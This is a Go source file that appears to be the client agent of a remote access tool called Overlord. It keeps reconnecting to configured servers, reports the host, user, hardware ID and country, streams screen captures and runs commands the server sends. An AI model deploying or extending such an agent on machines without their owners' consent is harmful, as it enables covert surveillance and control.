package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/handlers"
	"overlord-client/cmd/agent/plugins"
	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"

	"nhooyr.io/websocket"
)

func runClient(cfg config.Config) {
	baseBackoff := computeBaseBackoff()
	backoff := baseBackoff
	log.Printf("runtime GOOS=%s GOARCH=%s cfg.OS=%s cfg.Arch=%s", runtime.GOOS, runtime.GOARCH, cfg.OS, cfg.Arch)

	if len(cfg.ServerURLs) == 0 {
		log.Fatal("No server URLs configured")
	}

	if len(cfg.ServerURLs) > 1 {
		log.Printf("Failover enabled with %d servers:", len(cfg.ServerURLs))
		for i, url := range cfg.ServerURLs {
			marker := ""
			if i == cfg.ServerIndex {
				marker = " (starting here)"
			}
			log.Printf("  [%d] %s%s", i, url, marker)
		}
	}

	transport := createHTTPTransport(cfg)
	currentIndex := cfg.ServerIndex
	consecutiveFailures := 0

	for {

		if currentIndex >= len(cfg.ServerURLs) {
			currentIndex = 0
		}

		currentServer := cfg.ServerURLs[currentIndex]
		ctx, cancel := context.WithCancel(context.Background())
		url := fmt.Sprintf("%s/api/clients/%s/stream/ws?role=client", currentServer, cfg.ID)

		header := http.Header{}
		if cfg.AgentToken != "" {
			header.Set("X-Agent-Token", cfg.AgentToken)
			log.Printf("[auth] using agent token: %s...", cfg.AgentToken[:min(16, len(cfg.AgentToken))])
		} else {
			log.Printf("[auth] WARNING: no agent token configured")
		}

		opts := &websocket.DialOptions{
			Subprotocols:    []string{"binary"},
			HTTPClient:      &http.Client{Transport: transport},
			HTTPHeader:      header,
			CompressionMode: websocket.CompressionContextTakeover, // Enable compression for better bandwidth
		}

		serverInfo := ""
		if len(cfg.ServerURLs) > 1 {
			serverInfo = fmt.Sprintf(" [%d/%d]", currentIndex+1, len(cfg.ServerURLs))
		}
		log.Printf("connecting to %s%s (TLS verify: %v)", currentServer, serverInfo, !cfg.TLSInsecureSkipVerify)

		conn, _, err := websocket.Dial(ctx, url, opts)
		if err != nil {
			log.Printf("dial failed: %v (retrying in %s)", err, backoff)
			consecutiveFailures++

			if len(cfg.ServerURLs) > 1 {
				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
			}

			time.Sleep(backoff)
			backoff = rt.MinDuration(backoff*2, 30*time.Second)
			cancel()
			continue
		}

		if currentIndex != cfg.ServerIndex {
			if err := config.SaveServerIndex(currentIndex); err != nil {
				log.Printf("Warning: failed to save server index: %v", err)
			}
		}

		backoff = baseBackoff
		consecutiveFailures = 0
		log.Printf("connected successfully to %s%s", currentServer, serverInfo)

		if err := runSession(ctx, cancel, conn, cfg); err != nil {
			log.Printf("session ended: %v (retrying in %s)", err, backoff)

			if len(cfg.ServerURLs) > 1 {
				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
			}
		}

		time.Sleep(backoff)
		backoff = rt.MinDuration(backoff*2, 30*time.Second)
	}
}

func createHTTPTransport(cfg config.Config) *http.Transport {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: cfg.TLSInsecureSkipVerify,
		MinVersion:         tls.VersionTLS12,
	}

	if cfg.TLSCAPath != "" {
		caCert, err := os.ReadFile(cfg.TLSCAPath)
		if err != nil {
			log.Printf("[TLS] WARNING: Failed to read CA certificate from %s: %v", cfg.TLSCAPath, err)
		} else {
			caCertPool := x509.NewCertPool()
			if caCertPool.AppendCertsFromPEM(caCert) {
				tlsConfig.RootCAs = caCertPool
				log.Printf("[TLS] Loaded custom CA certificate from %s", cfg.TLSCAPath)
			} else {
				log.Printf("[TLS] WARNING: Failed to parse CA certificate from %s", cfg.TLSCAPath)
			}
		}
	}

	if cfg.TLSClientCert != "" && cfg.TLSClientKey != "" {
		cert, err := tls.LoadX509KeyPair(cfg.TLSClientCert, cfg.TLSClientKey)
		if err != nil {
			log.Printf("[TLS] WARNING: Failed to load client certificate: %v", err)
		} else {
			tlsConfig.Certificates = []tls.Certificate{cert}
			log.Printf("[TLS] Loaded client certificate for mutual TLS")
		}
	}

	if cfg.TLSInsecureSkipVerify {
		log.Printf("[TLS] WARNING: Certificate verification is DISABLED. This is insecure!")
	}

	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = tlsConfig
	return transport
}

func computeBaseBackoff() time.Duration {
	mode := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_MODE")))
	switch mode {
	case "dev", "development", "local":
		return time.Second
	case "release", "prod", "production":
		return 5 * time.Second
	default:
		return 5 * time.Second
	}
}

func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.Conn, cfg config.Config) (err error) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("session panic: %v", r)
			err = fmt.Errorf("session panic: %v", r)
		}
	}()
	defer cancel()
	defer conn.Close(websocket.StatusNormalClosure, "bye")

	env := &rt.Env{Conn: conn, Cfg: cfg, Cancel: cancel, SelectedDisplay: handlers.GetPersistedDisplay()}
	env.Console = rt.NewConsoleHub(env)
	env.Plugins = plugins.NewManager(env.Conn, plugins.HostInfo{ClientID: cfg.ID, OS: cfg.OS, Arch: cfg.Arch, Version: cfg.Version})
	defer env.Plugins.Close()
	dispatcher := handlers.NewDispatcher(env)

	osVal := strings.TrimSpace(cfg.OS)
	if osVal == "" {
		osVal = runtime.GOOS
	}

	archVal := strings.TrimSpace(cfg.Arch)
	if archVal == "" {
		archVal = runtime.GOARCH
	}

	hello := wire.Hello{
		Type:     "hello",
		ID:       cfg.ID,
		HWID:     cfg.HWID,
		Host:     rt.Hostname(),
		OS:       osVal,
		Arch:     archVal,
		Version:  cfg.Version,
		User:     rt.CurrentUser(),
		Monitors: capture.MonitorCount(),
		Country:  cfg.Country,
	}

	if err := wire.WriteMsg(ctx, env.Conn, hello); err != nil {
		return fmt.Errorf("send hello: %w", err)
	}

	readErr := make(chan error, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("readLoop panic: %v", r)
				readErr <- fmt.Errorf("readLoop panic: %v", r)
				cancel()
			}
		}()
		readErr <- readLoop(ctx, env, dispatcher)
	}()

	shotCtx, cancelShots := context.WithCancel(ctx)
	defer cancelShots()
	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("capture panic: %v", r)
				cancel()
			}
		}()
		capture.Loop(shotCtx, env)
	}()

	return <-readErr
}

func readLoop(ctx context.Context, env *rt.Env, dispatcher *handlers.Dispatcher) error {
	for {

		conn := env.Conn.(*websocket.Conn)
		_, data, err := conn.Read(ctx)
		if err != nil {
			return err
		}
		envelope, err := wire.DecodeEnvelope(data)
		if err != nil {
			log.Printf("decode: %v", err)
			continue
		}
		if err := dispatcher.Dispatch(ctx, envelope); err != nil {
			return err
		}
	}
}
